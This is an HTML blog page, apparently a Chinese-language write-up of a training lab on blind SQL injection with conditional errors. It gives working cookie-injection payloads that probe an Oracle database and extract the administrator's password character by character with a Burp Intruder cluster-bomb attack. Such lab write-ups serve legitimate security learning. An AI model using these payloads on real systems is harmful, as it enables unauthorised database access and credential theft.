@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Lab: Blind SQL injection with conditional errors已知信息： 存在SQL盲注漏洞 使用cookie，并执行包含提交cookie值的SQL查询 数据库包含名为users的表，该表包含列username和password  目标：获得username&#x3D;‘administrator’的password并登录 过程： 在截获的HTTP报文找到 1Cookie:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://h01iday.github.io/2021/08/13/SQL%20injection-Blind%20with%20conditional%20errors/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Lab: Blind SQL injection with conditional errors已知信息： 存在SQL盲注漏洞 使用cookie，并执行包含提交cookie值的SQL查询 数据库包含名为users的表，该表包含列username和password  目标：获得username&#x3D;‘administrator’的password并登录 过程： 在截获的HTTP报文找到 1Cookie:">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-08-13T02:02:07.672Z">
+<meta property="article:modified_time" content="2021-09-11T00:33:17.311Z">
+<meta property="article:author" content="H01iday">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://h01iday.github.io/2021/08/13/SQL%20injection-Blind%20with%20conditional%20errors/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://h01iday.github.io/2021/08/13/SQL%20injection-Blind%20with%20conditional%20errors/","path":"2021/08/13/SQL injection-Blind with conditional errors/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-conditional-errors"><span class="nav-number">1.</span> <span class="nav-text">Lab: Blind SQL injection with conditional errors</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%B2%E7%9F%A5%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">已知信息：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%EF%BC%9A"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">目标：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">过程：</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">H01iday</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/08/13/SQL%20injection-Blind%20with%20conditional%20errors/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="H01iday">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-08-13 10:02:07" itemprop="dateCreated datePublished" datetime="2021-08-13T10:02:07+08:00">2021-08-13</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-09-11 08:33:17" itemprop="dateModified" datetime="2021-09-11T08:33:17+08:00">2021-09-11</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Lab-Blind-SQL-injection-with-conditional-errors"><a href="#Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab: Blind SQL injection with conditional errors"></a>Lab: Blind SQL injection with conditional errors</h1><h4 id="已知信息："><a href="#已知信息：" class="headerlink" title="已知信息："></a>已知信息：</h4><ul>
+<li>存在SQL盲注漏洞</li>
+<li>使用cookie，并执行包含提交cookie值的SQL查询</li>
+<li>数据库包含名为users的表，该表包含列username和password</li>
+</ul>
+<h4 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h4><p>获得username=‘administrator’的password并登录</p>
+<h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><ol>
+<li><p>在截获的HTTP报文找到</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=5EPF5vm2ZLKfZtK6;</span><br></pre></td></tr></table></figure></li>
+<li><p>添加<code>&#39;</code>，response报错 ：500</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=5EPF5vm2ZLKfZtK6&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>【从上可知，可以接收到error message】</p>
+</li>
+<li><p>查看提交cookie值进行SQL查询返回多少列</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=5EPF5vm2ZLKfZtK6&#x27; order by 1--;</span><br><span class="line">》》200</span><br><span class="line">TrackingId=5EPF5vm2ZLKfZtK6&#x27; order by 2--;</span><br><span class="line">》》500</span><br><span class="line">》》》可知，只返回1列</span><br></pre></td></tr></table></figure></li>
+<li><p>查看使用的数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select null--;</span></span><br><span class="line"><span class="string">》》500</span></span><br><span class="line"><span class="string">TrackingId=5EPF5vm2ZLKfZtK6&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--;</span></span><br><span class="line">》》<span class="number">200</span></span><br><span class="line">》》》可知，使用的是Oracle数据库</span><br></pre></td></tr></table></figure></li>
+<li><p>查看是否存在名为users的表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select null from users--;</span></span><br><span class="line"><span class="string">》》200</span></span><br><span class="line"><span class="string">TrackingId=5EPF5vm2ZLKfZtK6&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">from</span> name<span class="operator">-</span><span class="keyword">of</span><span class="operator">-</span><span class="keyword">no</span><span class="operator">-</span><span class="keyword">table</span><span class="comment">--;</span></span><br><span class="line">》》<span class="number">500</span></span><br><span class="line">》》》可确定含有users表</span><br></pre></td></tr></table></figure></li>
+<li><p>查看是否存在username = ‘administrator’的用户</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select case when (username=&#x27;</span>administrator<span class="string">&#x27;) then to_char(1/0) else null end from users--;</span></span><br><span class="line"><span class="string">》》500</span></span><br><span class="line"><span class="string">TrackingId=5EPF5vm2ZLKfZtK6&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (username<span class="operator">=</span><span class="string">&#x27;?????&#x27;</span>) <span class="keyword">then</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">else</span> <span class="keyword">null</span> <span class="keyword">end</span> <span class="keyword">from</span> users<span class="comment">--;</span></span><br><span class="line">》》<span class="number">200</span></span><br><span class="line">》》》可确定既有username这列，也有username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>的用户</span><br></pre></td></tr></table></figure>
+
+<p>and select ‘a’ from users where username = ‘administrator’ = ’b？@！#！’都是返回200，因为这只是没有查找对应的内容，返回null罢了，但不会导致数据库报错。用to_char(1/0)目的是让数据库报错</p>
+<p><code>TrackingId=5EPF5vm2ZLKfZtK6&#39; union select case when (username=&#39;administrator&#39;) then to_char(1/0) else null end from users--;</code></p>
+</li>
+<li><p>确定密码的长度（Intruder）</p>
+<p>将password&gt;1中的1作为变量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select case when (username=&#x27;</span>administrator<span class="string">&#x27; and length(password)&gt;1) then to_char(1/0) else null end from users--;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终可确定，长度为20</p>
+<p>这里有一个问题！就是为什么把to_char(1/0)和null换位置就不work了？</p>
+</li>
+<li><p>确定密码 attack type为cluster bomb</p>
+<p>§ ‘…’§中的内容为变量，下边确定了两个变量</p>
+<p>第一个变量的payload option有1-20</p>
+<p>第二个变量的payload option有a-z0-9</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select case when (username=&#x27;</span>administrator<span class="string">&#x27; and substr(password,§1§,1)!=&#x27;</span>§a§<span class="string">&#x27;) then to_char(1/0) else null end from users--;</span></span><br></pre></td></tr></table></figure>
+
+<p>即可获得密码</p>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/08/12/SQL%20injection-Blind%20with%20conditional%20responses/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/09/10/linux/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">H01iday</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
